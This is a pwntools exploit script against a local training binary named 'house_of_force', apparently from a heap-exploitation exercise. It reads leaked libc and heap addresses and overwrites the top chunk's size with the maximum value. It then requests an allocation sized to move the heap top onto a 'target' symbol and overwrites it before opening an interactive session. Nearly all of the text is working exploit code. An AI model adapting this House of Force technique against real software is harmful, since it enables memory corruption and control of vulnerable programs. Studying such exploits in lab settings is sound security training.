#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./house_of_force')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# tbreak main
continue
'''.format(**locals())

context.terminal = ["tilix", "-a", "session-add-right", "-e"]
context.log_level = 'debug'
context.delete_corefiles = True

# -- Exploit goes here --

io = start()

io.recvuntil('@ ')
puts_addr = int(io.recvline()[:-1], base=16)
debug("GOT PUTS ADDRESS = %x", puts_addr)

io.recvuntil('@ ')
heap_addr = int(io.recvline()[:-1], base=16)
debug("GOT HEAP ADDRESS = %x", heap_addr)

# allocate a chunk
def malloc(size, data):
    io.sendlineafter('> ', '1')
    io.sendlineafter(': ', str(size))
    io.sendlineafter(': ', data)

# overwrite top chunk size with largest possible value
malloc(24, b'S'*24 + p64(0xffffffffffffffff))

# call malloc with very larget size
malloc(0xffffffffffffffff - (heap_addr + 0x38 - exe.symbols.target), 'gori tere pyaar me')

# write over target
malloc(24, 'VjJ0a1YyRldiRmxVYmxKb1YwWktiMUV5WXpsUVVXODlDZz09Cg==')

io.interactive()

